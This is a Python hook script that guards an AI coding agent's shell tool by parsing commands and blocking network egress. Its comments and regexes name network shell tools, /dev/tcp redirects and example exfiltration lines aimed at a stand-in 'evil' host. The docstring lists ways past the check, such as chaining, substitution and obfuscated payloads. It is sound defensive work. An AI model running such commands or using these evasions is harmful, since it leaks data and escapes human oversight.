#!/usr/bin/env python3
"""PreToolUse hook (matcher: Bash) — raise the egress speed bump the security stream points at.

Under `defaultMode: bypassPermissions` only `permissions.deny` enforces, and per-binary denies
CANNOT be a real network-egress boundary while `python3`/`node`/`npx` stay on the allow list
(see docs/security-model.md and settings.README.md — the interpreters open sockets themselves,
so denying `curl`/`wget` proves nothing). This hook inspects the Bash command's argv BEFORE it
runs and blocks the OBVIOUS, common egress forms those docs name that no deny rule can catch:

  1. INTERPRETER / SHELL inline-code egress one-liners — the argument to an interpreter's
     inline-eval flag (`python3 -c 'import urllib.request; ...'`, `node -e 'fetch(...)'`,
     `ruby/perl -e`, `php -r`, `bash -c '... curl ...'`) scanned for a named outbound primitive;
  2. BARE network primitives as the command word (`curl`/`wget`/`ncat`/`nc`/`telnet`, plus the
     remote-shell/copy/socket family `ssh`/`scp`/`sftp`/`rsync`/`socat`/`ftp`) or a
     `/dev/tcp`//dev/udp redirect in any command piece — the anchored `Bash(curl *)` deny only
     fires when the primitive is the FIRST word, so one after `&&`/`;`/`|` (or behind a prefix)
     slips it (security-model.md:9);
  3. `gh api` WRITES in any argv position — `gh api /repos/O/R -X DELETE` slips past the prefix
     deny because the write flag follows the URL (security-model.md:28); parsing argv sees the
     method wherever it sits, and flags gh's implicit-POST field flags too.

To keep this from being N brittle per-form branches (each a bypass a sibling form slips), argv
is CANONICALIZED once before scanning: strip every leading prefix (grouping noise, bare
`NAME=VAL` env assignments, `sudo`/`doas`, value-consuming wrappers) to reach the real command
word, then read inline-code flags through a single walk that handles bundled/glued/separate
forms uniformly. One normalization pass, one scanner — not a branch per tokenization quirk.

This is an HONEST speed bump, not a seal. It raises the bar on the casual / accidental / obvious
path — exactly what the deny list already aims at — but a determined caller still gets through:
base64- or variable-obfuscated payloads, sockets built without a named primitive, and interpreters
that read their code from a file or stdin are all invisible here. Closing that for real needs
OS-level network sandboxing (egress firewall / netns), not a command parser. The `gh api` branch
is now the live enforcement point: the blanket `Bash(gh api *)` deny was narrowed (#76/#101) to the
two write-method forms so read-only GETs are re-allowed, and this branch catches writes in any argv
position that the prefix deny misses.

Fail-open on any error — a hook bug must never wedge the session (repo convention; the deny list
remains as the belt to this hook's suspenders). Exit 2 = block; exit 0 = allow.
"""
import json
import re
import sys

from _hookutil import basename, pieces as _base_pieces

# Leading tokens that merely group/subshell a command; skip them to reach the real command word.
LEADING_NOISE = {"(", "{", "!"}

# Leading wrappers stripped before reading the real command word. Superset of the set Claude Code
# strips (timeout/time/nice/nohup/stdbuf/xargs) plus `env`, a common interpreter-indirection form.
WRAPPERS = {"timeout", "time", "nice", "nohup", "stdbuf", "xargs", "env"}
# Wrapper option flags that consume a following value (so `timeout -s KILL 5 cmd` reaches `cmd`).
WRAPPER_VALUE_OPTS = {"-s", "--signal", "-k", "--kill-after", "-n", "--adjustment", "-I", "-L", "-P"}
DURATION_RE = re.compile(r"[0-9]+(\.[0-9]+)?[smhdSMHD]?")  # timeout's bare DURATION positional
# Privilege wrappers that take their own options then a command word (`sudo -u user cmd`, `doas`).
# Treated as value-less wrappers so a `sudo`/`doas` prefix can't shift the command word out of the
# scan (#119); SUDO_VALUE_OPTS are the separate-value options whose argument must also be skipped.
# Union of both sudo/doas long-option surfaces independently identified against #119 (user/group/
# prompt/role/type from one pass, host/chroot/chdir from the other) — kept as a union, not either
# alone, so neither's flag coverage regresses.
SUDO = {"sudo", "doas"}
SUDO_VALUE_OPTS = {
    "-u", "--user", "-g", "--group", "-p", "--prompt", "-C", "-r", "--role", "-t", "--type",
    "-U", "-h", "--host", "-R", "-D",
}
# A bare inline env-assignment prefix (`FOO=bar cmd`) — NAME=VALUE with a valid shell identifier —
# likewise shifts the command word; skip a leading run of them the way `env VAR=VAL` is skipped (#119).
ENV_ASSIGN_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_]*=")

# Per-interpreter inline-code flags. Only the flags that actually take *code* — `-c` is code for
# python/shell but a syntax check for node/ruby/perl, so it is NOT listed for those; `-p` prints
# code for node but is a loop wrapper for perl. Getting this per-family right avoids blocking an
# innocent `perl -n file.log`. Bundled/glued forms (perl/ruby `-pe`/`-ne`, python `-Ic`) are
# decomposed by the single flag walk in inline_payloads(), not by per-family special cases.
INLINE_FLAGS = {
    "python": {"-c"}, "python2": {"-c"}, "python3": {"-c"},
    "node": {"-e", "--eval", "-p", "--print"}, "nodejs": {"-e", "--eval", "-p", "--print"},
    "bun": {"-e", "--eval", "-p", "--print"}, "deno": {"-e", "--eval"},
    "ruby": {"-e"}, "perl": {"-e", "-E"}, "php": {"-r"},
    "bash": {"-c"}, "sh": {"-c"}, "zsh": {"-c"}, "dash": {"-c"},
}
INTERPRETERS = set(INLINE_FLAGS)
# Versioned interpreter basenames (`python3.11`, `python2.7`, `perl5.36`, `ruby3.0`) are a normal,
# non-obfuscated invocation form present on most distros, but they miss the exact-basename
# INTERPRETERS lookup. VERSION_SUFFIX_RE strips a trailing `X` or `X.Y[.Z]` version so the family
# key can be recovered — else `python3.11 -c '...urllib...'` slips past the inline scan. (#112)
VERSION_SUFFIX_RE = re.compile(r"^([a-z]+)(\d+)(?:\.\d+)*$")

# Named outbound primitives across python / node / ruby / perl / php / shell. A match inside an
# inline-code payload means "this one-liner reaches the network" — the exfil/fetch the docs name.
# The trailing bare-binary group mirrors BARE_NET_BINARIES so an interpreter-wrapped invocation
# (`bash -c 'ssh evil'`, `python3 -c 'os.system("scp f evil:")'`) is caught the same as the bare
# command word (#158) — closing the curl-vs-ssh asymmetry where only curl was scanned in payloads.
# These are `\bword\b` substring matches (like `\bcurl\b`), so an innocent mention inside a payload
# string/identifier can false-positive; that is the accepted speed-bump cost the block message names.
NET_RE = re.compile(
    r"""
      \burllib\b | urlopen | \brequests\b | \bhttpx\b | \burllib3\b | \bhttp\.client\b | \bhttplib\b
    | \bsmtplib\b | \bftplib\b | \btelnetlib\b | \bpoplib\b | \bimaplib\b | \bparamiko\b
    | socket\.socket | socket\.create_connection | create_connection | asyncio\.open_connection
    | \bfetch\s*\( | \bXMLHttpRequest\b | axios | node-fetch | \bgot\s*\(
    | require\(\s*['"`](?:node:)?(?:http|https|net|tls|dgram)['"`]\s*\)
    | \bhttps?\.(?:get|request)\s*\( | \bnet\.(?:connect|createConnection)\s*\(
    | \btls\.connect\s*\( | Deno\.connect\s*\(
    | \bNet::HTTP\b | \bIO::Socket\b | \bLWP\b | \bHTTP::Tiny\b | \bHTTP::Request\b
    | \bfsockopen\b | \bstream_socket_client\b | \bcurl_exec\b | \bcurl_init\b
    | (?:file_get_contents|fopen)\s*\(\s*['"]https?:// | \bURI\.open\b | \bopen\s*\(\s*['"]https?://
    | \bcurl\b | \bwget\b | \bncat\b | \btelnet\b | /dev/tcp/
    | \bssh\b | \bscp\b | \bsftp\b | \brsync\b | \bsocat\b | \bftp\b
    """,
    re.VERBOSE,
)

# A net binary invoked as the command word ITSELF — not inside an interpreter payload — is the
# other half of the anchored-deny gap (#115): `Bash(curl *)` matches only when `curl` is the
# first word, so `… && curl …` or `sudo curl …` slips it. Checked against the command word after
# prefix-stripping (unambiguous, unlike a substring scan of the whole line), plus a token scan for
# bash's `/dev/tcp`//dev/udp egress redirect (`echo x > /dev/tcp/host/port`). The remote-shell /
# copy / socket family (`ssh`/`scp`/`sftp`/`rsync`/`socat`/`ftp`) is the same class (#131): they
# are exfil primitives too and the `Bash(ssh *)`/`Bash(scp *)` denies likewise fire only on the
# first word — a chained/prefixed `… && ssh evil` slips both the deny and this check without them.
BARE_NET_BINARIES = {
    "curl", "wget", "ncat", "nc", "netcat", "telnet",
    "ssh", "scp", "sftp", "rsync", "socat", "ftp",
}
DEV_TCP_RE = re.compile(r"/dev/(?:tcp|udp)/")

# `gh api` write signals: an explicit mutating method, or gh's implicit-POST field/body flags.
WRITE_METHODS = {"POST", "PUT", "PATCH", "DELETE"}
FIELD_FLAGS = {"-f", "-F", "--field", "--raw-field", "--input"}


def canonical_interpreter(cmd):
    """Map a possibly-versioned interpreter basename to its INTERPRETERS key, else return cmd.

    `python3.11` -> `python3`, `python2.7` -> `python2`, `perl5.36` -> `perl`. Exact matches pass
    through untouched; a non-interpreter word (e.g. `gh`, `python3-config`) returns unchanged.
    """
    if cmd in INTERPRETERS:
        return cmd
    m = VERSION_SUFFIX_RE.match(cmd)
    if m:
        base, major = m.group(1), m.group(2)
        for cand in (base + major, base):  # python3.11 -> python3, then bare python
            if cand in INTERPRETERS:
                return cand
    return cmd


def strip_prefixes(argv):
    """Drop everything before the real command word, in one pass: grouping noise, bare
    `NAME=VALUE` env assignments, `sudo`/`doas`, and value-consuming wrappers + their args
    (`timeout 5 python3` -> `python3`, `FOO=1 sudo -u x curl …` -> `curl …`). Collapses the
    whole "a leading prefix shifts the command word out of argv[0]" bypass class (#119)."""
    i, n = 0, len(argv)
    while i < n:
        tok = argv[i]
        if tok in LEADING_NOISE:
            i += 1
            continue
        if not tok.startswith("-") and ENV_ASSIGN_RE.match(tok):
            i += 1  # a bare VAR=VAL assignment sitting before the command word
            continue
        base = basename(tok)
        if base in SUDO:
            i += 1
            while i < n and argv[i].startswith("-"):  # sudo/doas own option flags
                if argv[i] in SUDO_VALUE_OPTS and i + 1 < n and not argv[i + 1].startswith("-"):
                    i += 1  # ...and that flag's separate value
                i += 1
            continue
        if base not in WRAPPERS:
            break
        i += 1
        while i < n and argv[i].startswith("-"):  # the wrapper's own option flags
            if argv[i] in WRAPPER_VALUE_OPTS and i + 1 < n and not argv[i + 1].startswith("-"):
                i += 1  # ...and that flag's separate value
            i += 1
        if base == "env":
            while i < n and "=" in argv[i] and not argv[i].startswith("-"):
                i += 1  # env's inline VAR=VAL assignments
        elif base == "timeout" and i < n and DURATION_RE.fullmatch(argv[i]):
            i += 1  # timeout's mandatory DURATION positional
    return argv[i:]


def inline_payloads(cmd, argv):
    """Yield every inline-code string this interpreter argv runs, via ONE normalization walk.

    All flag shapes are decomposed uniformly so no single form slips: separate-arg (`-c CODE`),
    glued (`-cCODE`), long (`--eval CODE` / `--eval=CODE`), and short-flag BUNDLES that end in or
    carry the family's code letter — `-Ic CODE`, `-IcCODE` (#105/#120), perl/ruby `-ne'CODE'`,
    `-pe'CODE'` (#126). For a single-dash bundle we walk to the FIRST code-flag letter for this
    family (`c`/`e`/`E`/`r`/`p`); the glued remainder is the payload, or the next argv token when
    the letter ends the bundle. Preceding letters are treated as boolean options, so `perl -n
    file.log` (n is not a perl code letter) yields nothing — no false block on an innocent loop.
    """
    flags = INLINE_FLAGS.get(cmd, set())
    code_letters = {f[1] for f in flags if len(f) == 2}    # single-char code flags: c / e / E / r / p
    long_flags = {f for f in flags if f.startswith("--")}  # --eval / --print
    if cmd == "deno" and len(argv) >= 3 and argv[1] == "eval":
        yield " ".join(argv[2:])  # `deno eval CODE...` (subcommand, not a flag)
    j = 1
    while j < len(argv):
        tok = argv[j]
        if tok.startswith("--"):
            name, eq, tail = tok.partition("=")
            if name in long_flags:
                if eq:
                    yield tail                    # --eval=CODE
                elif j + 1 < len(argv):
                    j += 1
                    yield argv[j]                 # --eval CODE
        elif tok.startswith("-") and len(tok) > 1 and code_letters:
            for k in range(1, len(tok)):
                if tok[k] in code_letters:
                    if k + 1 < len(tok):
                        yield tok[k + 1:]         # glued: -cCODE / -IcCODE / -ne'CODE'
                    elif j + 1 < len(argv):
                        j += 1
                        yield argv[j]             # separate: -c CODE / -Ic CODE
                    break
        j += 1


def gh_api_is_write(argv):
    """True if this `gh api ...` argv mutates state (explicit method or implicit-POST fields).

    Field/body flags are matched in every shape gh/pflag accepts: exact (`-f`, `--field`),
    long-glued (`--field=x=y`), and short-glued (`-ftitle=x`, `-Fkey=@file`) — the last of which
    is a real state-mutating POST that the exact/long checks alone miss (#121), mirroring the
    glued `-XPOST` method handling.
    """
    method = None
    for j, tok in enumerate(argv):
        if tok in ("-X", "--method"):
            if j + 1 < len(argv):
                method = argv[j + 1].upper()
        elif tok.startswith("-X") and len(tok) > 2:
            method = tok[2:].upper()
        elif tok.startswith("--method="):
            method = tok.split("=", 1)[1].upper()
        elif (tok in FIELD_FLAGS or tok.split("=", 1)[0] in FIELD_FLAGS
              or (len(tok) > 2 and tok[0] == "-" and tok[1] in ("f", "F"))):
            if method is None:
                method = "POST"  # gh defaults to POST when any field/body flag is present, incl.
                                  # glued short forms `-ftitle=x` / `-Fkey=@file` (#121)
    return method in WRITE_METHODS


def substitution_inners(command):
    """Yield the inner text of each command/process substitution at the TOP level of `command`:
    `$(...)`, `` `...` ``, `<(...)`, `>(...)`. `pieces()` re-feeds each inner through itself, so
    nested substitutions (`$(foo $(bar))`) are reached by that recursion, not here.

    Single-quoted spans are skipped (a `$(...)` inside `'...'` is a literal string, no substitution);
    double-quoted spans are still scanned (`"$(curl ...)"` does substitute). Best-effort quote/paren
    tracking — on any imbalance we yield what was found and stop rather than raise, because the hook
    must fail open. This is what makes `echo $(curl http://evil)` visible to the argv scanners (#136).
    """
    i, n = 0, len(command)
    in_double = False
    while i < n:
        c = command[i]
        if c == "\\":
            i += 2                       # escaped next char (incl. \$, \`) — never a substitution
            continue
        if c == '"':
            in_double = not in_double
            i += 1
            continue
        if c == "'" and not in_double:
            j = command.find("'", i + 1)  # skip the whole single-quoted (literal) span
            if j == -1:
                break
            i = j + 1
            continue
        if c == "`":                     # `...` backtick substitution (also inside double quotes)
            j = command.find("`", i + 1)
            if j == -1:
                break
            yield command[i + 1:j]
            i = j + 1
            continue
        # $( ... ) command substitution, or <( ... )/>( ... ) process substitution (unquoted only)
        if (c == "$" or (c in "<>" and not in_double)) and i + 1 < n and command[i + 1] == "(":
            k = i + 2
            depth = 1
            quote = None                 # track quotes inside the span so a quoted ')' doesn't close it
            while k < n and depth > 0:
                ck = command[k]
                if quote is not None:
                    if ck == "\\" and quote == '"':
                        k += 2
                        continue
                    if ck == quote:
                        quote = None
                    k += 1
                    continue
                if ck == "\\":
                    k += 2
                elif ck in ("'", '"'):
                    quote = ck
                    k += 1
                elif ck == "(":
                    depth += 1
                    k += 1
                elif ck == ")":
                    depth -= 1
                    k += 1
                else:
                    k += 1
            end = k - 1 if depth == 0 else k   # k-1 drops the matched ')'; on imbalance take the rest
            yield command[i + 2:end]
            i = k
            continue
        i += 1


def pieces(command):
    """Yield the argv list of each simple command (see `_hookutil.pieces` for the base tokenizer).

    Before the top-level split, surface every command/process substitution's inner text as its own
    command piece and recurse into it (#136): `echo $(curl http://evil)` otherwise tokenizes to a
    single `echo ...` piece whose command word is `echo`, hiding the net primitive from every scan
    in `offending()`. Feeding the substitution inner back through `pieces()` lets the existing
    BARE_NET_BINARIES / gh_api_is_write / inline / /dev/tcp scanners catch a primitive wherever it
    sits — one extraction pass in front of the same scanners, not a new per-form branch.
    """
    for inner in substitution_inners(command):
        yield from pieces(inner)
    yield from _base_pieces(command)


def offending(command):
    """Return a human reason string if any command piece is a blocked egress form, else None."""
    for argv in pieces(command):
        argv = strip_prefixes(argv)
        if not argv:
            continue
        cmd = canonical_interpreter(basename(argv[0]))

        if cmd == "eval" and len(argv) >= 2:
            # `eval` runs its argument string AS a command, but it is not an interpreter with an
            # inline-code flag — so its payload is never re-scanned unless we re-feed it. Join the
            # remaining argv tokens and run them back through the same pass, the way an inline-code
            # payload is scanned: `eval "curl …"`, `eval curl …`, `eval "python3 -c '…urllib…'"` all
            # reach the network. One more code-runner into the existing canonicalization pass, not a
            # sibling branch (CLAUDE.md #129). Recursion terminates: each pass drops the `eval` word.
            inner = offending(" ".join(argv[1:]))
            if inner:
                return inner

        if cmd in INTERPRETERS:
            for payload in inline_payloads(cmd, argv):
                if NET_RE.search(payload):
                    return (
                        f"an inline `{cmd}` one-liner that opens a network connection "
                        f"(matched an outbound primitive in its inline-code payload)"
                    )

        if cmd == "gh" and len(argv) >= 2 and argv[1] == "api" and gh_api_is_write(argv):
            return "a `gh api` call with a write method (POST/PUT/PATCH/DELETE or an implicit-POST field flag)"

        if cmd in BARE_NET_BINARIES:
            return (
                f"a bare `{cmd}` network call as a command word (the anchored `Bash({cmd} *)` "
                f"deny only catches it as the first word, not after `&&`/`;`/`|` or a prefix)"
            )

        if any(DEV_TCP_RE.search(tok) for tok in argv):
            return "a `/dev/tcp` (or `/dev/udp`) network redirect (a bash built-in socket, not a real file)"

    return None


def check(command, cwd):
    """Dispatcher-facing predicate (#163): (command, cwd) -> full block message, or None.

    `cwd` is unused here — this rail needs no repo state — but the parameter is part of the
    shared `check(command, cwd) -> reason | None` contract `pretooluse-bash.py` registers every
    rail against, so every predicate takes it even when it's ignored.
    """
    reason = offending(command)
    if not reason:
        return None
    return (
        "Egress speed bump (PreToolUse): this Bash command was blocked because it looks like "
        f"{reason}. Direct network egress from an interpreter or a `gh api` write is not an "
        "approved path here (docs/security-model.md). If you need to fetch a URL use WebFetch/"
        "WebSearch; for GitHub reads use the read-only `gh` subcommands or a `gh api ... GET`. "
        "If this is a legitimate non-egress command that tripped a substring match, restructure "
        "it so the flagged token isn't present."
    )


def main():
    try:
        data = json.load(sys.stdin)
    except Exception:
        sys.exit(0)

    if data.get("tool_name") != "Bash":
        sys.exit(0)

    command = (data.get("tool_input") or {}).get("command")
    if not isinstance(command, str):
        sys.exit(0)

    try:
        message = check(command, data.get("cwd") or None)
    except Exception:
        sys.exit(0)  # never wedge the session on a hook bug

    if not message:
        sys.exit(0)

    print(message, file=sys.stderr)
    sys.exit(2)


if __name__ == "__main__":
    main()
